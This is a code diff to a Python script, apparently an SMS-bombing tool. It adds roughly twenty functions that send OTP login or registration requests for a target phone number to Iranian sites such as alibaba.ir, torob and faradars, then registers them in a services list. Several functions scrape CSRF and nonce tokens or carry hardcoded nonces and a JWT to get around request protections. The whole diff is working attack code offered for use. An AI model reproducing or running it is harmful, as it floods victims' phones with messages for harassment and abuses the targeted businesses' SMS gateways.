@@ -965,23 +965,481 @@ def irantic(phone):
 
 
 
+def plaza(phone):
+    import requests
+    phone = '0' + ''.join(filter(str.isdigit, str(phone)))[-10:]
+    url = "https://plazadigital.ir/wp-admin/admin-ajax.php"
+    data = {
+        "type": "goAuth",
+        "action": "plaza_auth_action",
+        "inputs": f"username={phone}&otp_type=sms&plazaterms=yes&security=a73f560285"
+    }
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "X-Requested-With": "XMLHttpRequest"
+    }
+    try:
+        r = requests.post(url, data=data, headers=headers, timeout=10)
+        return r.status_code, r.text
+    except Exception as e:
+        return None, str(e)
+
+
+
+def namatek(phone):
+    import requests
+    phone = '0' + ''.join(filter(str.isdigit, str(phone)))[-10:]
+    url = "https://proback.namatek.com/Account/SignInByOTP"
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+    }
+    try:
+        r = requests.post(url, json={"mobile": phone}, headers=headers, timeout=10)
+        return f"Status: {r.status_code}, Response: {r.text}"
+    except Exception as e:
+        return f"Error: {e}"
+
+
+
+def iticket(phone):
+    import requests
+    phone = '0' + ''.join(filter(str.isdigit, str(phone)))[-10:]
+    url = "https://api.iticket.ir/api/v3/login/request"
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "Origin": "https://iticket.ir",
+        "Referer": "https://iticket.ir/"
+    }
+    try:
+        r = requests.post(url, json={"mobile": phone}, headers=headers, timeout=10)
+        return f"Status: {r.status_code}, Response: {r.text}"
+    except Exception as e:
+        return f"Error: {e}"
+
+
+
+
+
+def alibaba(phone):
+    url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
+    headers = {
+        "Content-Type": "application/json",
+        "Accept": "application/json, text/plain, */*",
+        "ab-channel": "WEB-NEW,PRODUCTION,CSR,www.alibaba.ir,mobile,Mobile Safari,26.5,iPhone,Apple,iOS,18.7,3.262.3",
+        "tracing-sessionid": "1781479582549",
+        "ab-alohomora": "7BD5Qnm2cUmuxBhG1V4PB9",
+        "tracing-device": "mobile,Mobile Safari,26.5,iPhone,Apple,iOS",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.7 Mobile/15E148 Safari/604.1"
+    }
+    
+    p = ''.join(filter(str.isdigit, str(phone)))
+    p = p[2:] if p.startswith('98') else p
+    p = p[1:] if p.startswith('0') else p
+    
+    try:
+        r = requests.post(url, json={"phoneNumber": p}, headers=headers, timeout=10)
+        return "Success" if r.status_code == 200 else f"Failed {r.status_code}"
+    except Exception:
+        return "Error"
+
+
+
+
+
+
+def normalize_phone(phone):
+    p = ''.join(filter(str.isdigit, str(phone)))
+    if p.startswith("98"):
+        p = p[2:]
+    if p.startswith("0"):
+        p = p[1:]
+    return p[-10:]
+
+
+def get_tokens(session, url):
+    print("[1] Fetching main page...")
+    r = session.get(url, timeout=(5, 15))
+    html = r.text
+
+    js_files = re.findall(r'<script[^>]+src=["\'](.*?)["\']', html)
+    print(f"[2] Found {len(js_files)} JS files")
+
+    sources = [html]
+
+    for i, js in enumerate(js_files[:5], 1):
+        try:
+            full = urljoin(url, js)
+            print(f"[3] Fetching JS {i}/5")
+            sources.append(session.get(full, timeout=(5, 15)).text)
+        except:
+            print(f"[!] JS {i} failed")
+
+    pattern = r'(?:csrf|nonce|dig_nounce)[^a-zA-Z0-9]{0,20}["\']([a-f0-9]{10})["\']'
+
+    tokens = set()
+    for c in sources:
+        tokens.update(re.findall(pattern, c, re.IGNORECASE))
+
+    print(f"[4] Tokens found: {list(tokens)}")
+    return list(tokens)
+
+
+def test_token(session, token, phone):
+    url = "https://nazarkade.com/wp-admin/admin-ajax.php"
+
+    data = {
+        "action": "digits_check_mob",
+        "countrycode": "+98",
+        "mobileNo": phone,
+        "csrf": token,
+        "dig_nounce": token,
+        "login": "2",
+        "json": "1"
+    }
+
+    print(f"[5] Testing token: {token}")
+
+    try:
+        r = session.post(url, data=data, timeout=(5, 15))
+        text = r.text
+
+        print(f"[6] Response: {text}")
+
+        if '"code":"1"' in text or '"code":1' in text:
+            print("[✔] ارسال شد")
+            return True
+
+    except:
+        print("[!] Request failed")
+
+    return False
+
+
+def nazarkade(phone):
+    session = requests.Session()
+    session.headers.update({
+        "User-Agent": "Mozilla/5.0",
+        "Referer": "https://nazarkade.com/"
+    })
+
+    phone = normalize_phone(phone)
+
+    tokens = get_tokens(session, "https://nazarkade.com/")
+
+    for t in tokens:
+        if test_token(session, t, phone):
+            print("[✔] Token valid:", t)
+            return t
+
+    print("[X] No valid token found")
+    return None
+
+
+
+ 
+
+
+def malltina(phone):
+    url = "https://api.malltina.com/api/v2/register"
+    mobile = '0' + ''.join(filter(str.isdigit, str(phone)))[-10:]
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+    }
+    try:
+        r = requests.post(url, json={"mobile": mobile}, headers=headers, timeout=10)
+        return f"Status: {r.status_code}, Response: {r.text}"
+    except Exception as e:
+        return f"Error: {e}"
+
+
+
+
+def attaryalibaba(phone):
+    url, base_url = "https://attaryalibaba.com/wp-admin/admin-ajax.php", "https://attaryalibaba.com/my-account/"
+    s = requests.Session()
+    s.headers.update({"User-Agent": "Mozilla/5.0", "Referer": base_url})
+    try:
+        r = s.get(base_url, timeout=10)
+        match = re.search(r'security["\']?\s*[:=]\s*["\']([a-zA-Z0-9]+)["\']', r.text)
+        if not match: return print("[ATTARYALIBABA] Security not found"), (None, None)
+        
+        res = s.post(url, data={"action": "voorodak__submit-username", "username": '0' + ''.join(filter(str.isdigit, str(phone)))[-10:], "security": match.group(1)}, timeout=10)
+        data = res.json() if res.headers.get('Content-Type', '').startswith('application/json') else res.text
+        print(f"[ATTARYALIBABA] STATUS: {res.status_code}\n[ATTARYALIBABA] RESPONSE: {data}")
+        return res.status_code, data
+    except Exception as e:
+        print(f"[ATTARYALIBABA] ERROR: {e}")
+        return None, str(e)
+
+
+
+
+def saalambaba(phone):
+    url = "https://saalambaba.com/login?back=my-account"
+    s = requests.Session()
+    s.headers.update({"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest", "Referer": url})
+    
+    try:
+        r = s.post(url, data={"id_customer": "", "back": "", "firstname": "نام", "lastname": "خانوادگی", "action": "register", "username": ''.join(filter(str.isdigit, str(phone)))[-10:], "ajax": "1"}, timeout=10)
+        data = r.json() if r.headers.get('Content-Type', '').startswith('application/json') else r.text
+        print(f"[SAALAMBABA] STATUS: {r.status_code}\n[SAALAMBABA] RESPONSE: {data}")
+        return r.status_code, data
+    except Exception as e:
+        print(f"[SAALAMBABA] ERROR: {e}")
+        return None, str(e)
+
+
+
+
+def janebi(phone):
+    url = "https://janebi.com/signin"
+    s = requests.Session()
+    s.headers.update({"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest", "Referer": url})
+    data = {"user_mobile": "0" + ''.join(filter(str.isdigit, str(phone)))[-10:], "confirm_code": "", "popup": "1", "signin": "1"}
+    
+    for i in range(3):
+        try:
+            print(f"[TRY {i+1}] sending request...")
+            r = s.post(url, data=data, timeout=(5, 30))
+            print(f"[STATUS] {r.status_code}\n[RESPONSE] {r.text[:200]}")
+            return r.text
+        except Exception as e:
+            print(f"[ERROR] {e}")
+            time.sleep(2)
+    return None
+
+
+
+
+
+def faradars(phone):
+    url, headers = "https://faradars.org/api/client/v1/auth/otp", {"Accept": "application/json", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "platform": "web", "Current-Url": "https://faradars.org/register"}
+    try:
+        r = requests.post(url, json={"mobile": "0" + ''.join(filter(str.isdigit, str(phone)))[-10:], "digits": 5, "platforms": "web", "source": "faradars", "recaptcha_token": ""}, headers=headers, timeout=10)
+        data = r.json() if r.headers.get('Content-Type', '').startswith('application/json') else r.text
+        print(f"[FARADARS] STATUS: {r.status_code}\n[FARADARS] RESPONSE: {data}")
+        return r.status_code, data
+    except Exception as e:
+        print(f"[FARADARS] ERROR: {e}")
+        return None, str(e)
+
+
+
+
+
+def normalize(phone):
+    d = ''.join(filter(str.isdigit, str(phone)))
+    return "0" + d[-10:] if len(d) >= 10 else d
+
+def torob(phone):
+    base_url = "https://api.torob.com/v4/user/phone"
+    mobile = normalize(phone)
+    params = {"phone_number": mobile, "source": "next_mobile", "_landing_page": "user_profile"}
+    headers = {"Accept": "application/json", "User-Agent": "Mozilla/5.0", "Referer": "https://www.torob.com/"}
+    session, results = requests.Session(), {}
+
+    for name, url in {"voice": f"{base_url}/send-voice-otp/", "pin": f"{base_url}/send-pin/"}.items():
+        try:
+            r = session.get(url, params=params, headers=headers, timeout=10)
+            print(f"\n[TOROB - {name.upper()}]\nSTATUS: {r.status_code}\nRESPONSE: {r.text}")
+            results[name] = {"status": r.status_code, "response": r.text}
+        except Exception as e:
+            print(f"[TOROB - {name}] ERROR: {e}")
+            results[name] = {"error": str(e)}
+    return results
+
+
+
+
+
+def sorrad(phone):
+    url, headers = "https://sorrad.ir/api/v1/sessions/login_request", {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
+    digits = ''.join(filter(str.isdigit, str(phone)))
+    mobile = "0" + digits[-10:] if len(digits) >= 10 else digits
+    try:
+        print("[1] Sending request...")
+        r = requests.post(url, json={"mobile_phone": mobile}, headers=headers, timeout=10)
+        data = r.json() if r.headers.get('Content-Type', '').startswith('application/json') else r.text
+        print(f"[STATUS] {r.status_code}\n[RESPONSE] {data}")
+        if r.status_code == 200:
+            print("✔ OTP SENT (likely)" if any(k in str(data).lower() for k in ["ok", "success", "true", "sent"]) else ("✖ FAILED" if "error" in str(data).lower() else "⚠ UNKNOWN RESULT"))
+        return data
+    except Exception as e:
+        print(f"[ERROR] {e}")
+        return None
+
+
+
+
+
+
+def yaniperfume(phone):
+    url, headers = "https://yaniperfume.com/wp-admin/admin-ajax.php", {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "Referer": "https://yaniperfume.com/",
+        "Origin": "https://yaniperfume.com",
+        "X-Requested-With": "XMLHttpRequest",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+    }
+    s = requests.Session()
+    s.headers.update(headers)
+    r = s.get("https://yaniperfume.com/")
+    nonce_match = re.search(r'account_detection_nonce_field["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)', r.text)
+    
+    payload = {
+        "mobile": "0" + ''.join(filter(str.isdigit, str(phone)))[-10:],
+        "iran": "yes",
+        "account_detection_nonce_field": nonce_match.group(1) if nonce_match else "4581299d89",
+        "_wp_http_referer": "/",
+        "action": "websima_auth_account_detection"
+    }
+    
+    res = s.post(url, data=payload)
+    print(f"[STATUS] {res.status_code}\n[RESPONSE] {res.text}")
+    return res.text
+
+
+
+
+
+
+
+
+
+
+
+def qeshminora(phone):
+    url = "https://qeshminora.com/wp-admin/admin-ajax.php"
+    session = requests.Session()
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "Referer": "https://qeshminora.com/",
+        "X-Requested-With": "XMLHttpRequest"
+    }
+
+    resp = session.get("https://qeshminora.com/", headers=headers, timeout=10)
+    
+    instance_id = re.search(r'instance_id["\']?\s*[:=]\s*["\']?([a-f0-9]+)', resp.text)
+    digits_form = re.search(r'digits_form["\']?\s*[:=]\s*["\']?([a-f0-9]+)', resp.text)
+    
+    payload = {
+        "login_digt_countrycode": "+98",
+        "digits_phone": ''.join(filter(str.isdigit, str(phone)))[-10:],
+        "action_type": "phone",
+        "digits_process_register": "1",
+        "signup_otp_mode": "1",
+        "rememberme": "1",
+        "digits": "1",
+        "instance_id": instance_id.group(1) if instance_id else "f569bd8ad85bb7e325fdea900dfbda3e",
+        "action": "digits_forms_ajax",
+        "type": "login",
+        "digits_form": digits_form.group(1) if digits_form else "9a133a7284",
+        "container": "digits_protected",
+        "sub_action": "sms_otp"
+    }
+
+    response = session.post(url, data=payload, headers=headers, timeout=15)
+    return response.json()
+
+
+
+
+
+
+def luxirana(phone, email="user@example.com"):
+    url, headers = "https://luxirana.com/lx/wp-admin/admin-ajax.php", {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "Referer": "https://luxirana.com/lx/",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+    }
+    s = requests.Session()
+    s.headers.update(headers)
+    resp = s.get("https://luxirana.com/lx/?login=true")
+    
+    inst_id = re.search(r'instance_id["\']?\s*[:=]\s*["\']?([a-f0-9]+)', resp.text)
+    form_id = re.search(r'digits_form["\']?\s*[:=]\s*["\']?([a-f0-9]+)', resp.text)
+    
+    payload = {
+        "login_digt_countrycode": "+98",
+        "digits_phone": ''.join(filter(str.isdigit, str(phone)))[-10:],
+        "action_type": "phone",
+        "email": email,
+        "digits_process_register": "1",
+        "digits": "1",
+        "instance_id": inst_id.group(1) if inst_id else "7fdce0cce4f0159955ef2799e436dff7",
+        "action": "digits_forms_ajax",
+        "type": "login",
+        "digits_form": form_id.group(1) if form_id else "5c3170464b",
+        "sub_action": "sms_otp",
+        "_wp_http_referer": "/?login=true&redirect_to&page=1"
+    }
+    
+    try:
+        r = s.post(url, data=payload, timeout=15)
+        data = r.json()
+        print(f"[STATUS] {r.status_code}\n[RESPONSE] {data}")
+        return data
+    except Exception as e:
+        print(f"[ERROR] {e}")
+        return None
+
+
+
+
+
+
+def ickala(phone):
+    digits = ''.join(filter(str.isdigit, str(phone)))
+    mobile = "0" + digits[-10:] if len(digits) >= 10 else digits
+    url, headers = "https://ickala.com/", {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "X-Requested-With": "XMLHttpRequest",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Referer": "https://ickala.com/"
+    }
+    payload = {
+        "controller": "SendSMS", "module": "loginbymobile", "ajax": "true", "fc": "module",
+        "SubmitSmsSend": "1", "otp_mobile_num": mobile, "lbm_id_country": "112", "back": "my-account",
+        "tokensms": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3ODE2MDkyMTUsImlzcyI6InBvb3lhLmlja2FsYS5zbXMiLCJuYmYiOjE3ODE2MDkyMTUsImV4cCI6MTc4MTYwOTUxNSwidXNlck5hbWUiOiJhZG1pbnBvb3lhIn0.-pXEV2OjX35VfWNCP7_vVgR2U4zLoT-VIenD2M85ncpbElttMWzEhVPS4yVD8z34UqZszzZNy68GzKu4FoHATA"
+    }
+    try:
+        r = requests.post(url, data=payload, headers=headers, timeout=10)
+        print(f"[STATUS] {r.status_code}\n[RESPONSE] {r.text}")
+        return r.text
+    except Exception as e:
+        print(f"[ERROR] {e}")
+        return None
+
+
+
+
+
 # ==========================
 # لیست سرویس‌ها
 # ==========================
-services = [
-    abantether, accounts1606, achareh, activecleaners, alldigitall,
-    alldigitall, alopeyk_safir, arzplus, arzunex, azkivam,
-    azno, basalam, bimeh, bimehland, bimeparsian,
-    bornosmode, cartesabz, chapmatin, charsooq, darunet,
-    dgshahr, didar24, digikala, digikala_call_v2, divar,
-    drto, ebimename, gap, ibime, irantic,
-    jabama, karnameh, khodro45, masterkala, mek,
-    milli_gold, motorbargh, mydigipay, okala, ompfinex,
-    otaghak, padmira, pinket, pindo, raheeno,
-    riiha, sarmayex, shahrfarsh, sheypoor, sibapp,
-    sibche, t4f, tetherland, theshoes, twox,
-    ubitex, vakiljo, zarinplus
+Services = [
+    abantether, accounts1606, achareh, activecleaners, alibaba,
+    alldigitall, alldigitall, alopeyk_safir, arzplus, arzunex,
+    attaryalibaba, azkivam, azno, basalam, bimeh,
+    bimehland, bimeparsian, bornosmode, cartesabz, chapmatin,
+    charsooq, darunet, dgshahr, didar24, digikala,
+    digikala_call_v2, divar, drto, ebimename, faradars,
+    gap, ibime, ickala, irantic, iticket,
+    jabama, janebi, karnameh, khodro45, luxirana,
+    malltina, masterkala, mek, milli_gold, motorbargh,
+    mydigipay, namatek, nazarkade, okala, ompfinex,
+    otaghak, padmira, pinket, pindo, plaza,
+    qeshminora, raheeno, riiha, saalambaba, sarmayex,
+    shahrfarsh, sheypoor, sibapp, sibche, sorrad,
+    t4f, tetherland, theshoes, torob, twox,
+    ubitex, vakiljo, yaniperfume, zarinplus
 ]
+
 
 
 
